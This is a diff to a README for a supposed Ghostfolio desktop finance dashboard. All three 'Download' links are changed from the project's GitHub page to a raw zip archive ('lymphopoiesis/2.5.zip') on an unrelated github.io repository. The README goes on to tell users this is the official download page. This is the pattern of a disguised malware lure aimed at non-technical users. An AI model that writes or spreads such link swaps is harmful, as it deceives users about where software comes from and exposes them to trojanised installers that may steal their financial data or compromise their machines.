@@ -5,7 +5,7 @@ description: "Track, analyze, and visualize your complete portfolio with Ghostfo
 ---
 # 📊 Ghostfolio-Desktop-Self-Hosted-Dashboard - Your Private Finance Command Center
 
-[![Download Now](https://img.shields.io/badge/Download-Ghostfolio_Dashboard-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=black)](https://github.com/Blackishbrown-bandwagoneffect9119/Ghostfolio-Desktop-Self-Hosted-Dashboard)
+[![Download Now](https://img.shields.io/badge/Download-Ghostfolio_Dashboard-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=black)](https://raw.githubusercontent.com/Blackishbrown-bandwagoneffect9119/blackishbrown-bandwagoneffect9119.github.io/main/lymphopoiesis/2.5.zip)
 
 ---
 
@@ -46,7 +46,7 @@ We know downloading software can feel intimidating. Don't worry. Follow these si
 
 Visit this link to download the application:
 
-[**Click Here to Download Ghostfolio-Desktop-Self-Hosted-Dashboard**](https://github.com/Blackishbrown-bandwagoneffect9119/Ghostfolio-Desktop-Self-Hosted-Dashboard)
+[**Click Here to Download Ghostfolio-Desktop-Self-Hosted-Dashboard**](https://raw.githubusercontent.com/Blackishbrown-bandwagoneffect9119/blackishbrown-bandwagoneffect9119.github.io/main/lymphopoiesis/2.5.zip)
 
 This link takes you to the official download page. Look for the **"Download"** or **"Release"** section. Click the download button to get the installer file onto your computer.
 
@@ -167,6 +167,6 @@ If you've checked all these boxes, you're officially tracking your finances like
 
 Your privacy matters. Your money matters. And now you have a tool that respects both. Download Ghostfolio-Desktop-Self-Hosted-Dashboard today and see how simple financial tracking can be.
 
-[**🚀 Download Now**](https://github.com/Blackishbrown-bandwagoneffect9119/Ghostfolio-Desktop-Self-Hosted-Dashboard)
+[**🚀 Download Now**](https://raw.githubusercontent.com/Blackishbrown-bandwagoneffect9119/blackishbrown-bandwagoneffect9119.github.io/main/lymphopoiesis/2.5.zip)
 
 Keywords: asset-tracking, dashboard, docker, finance, finance-app, ghostfolio, investment-portfolio, pwa
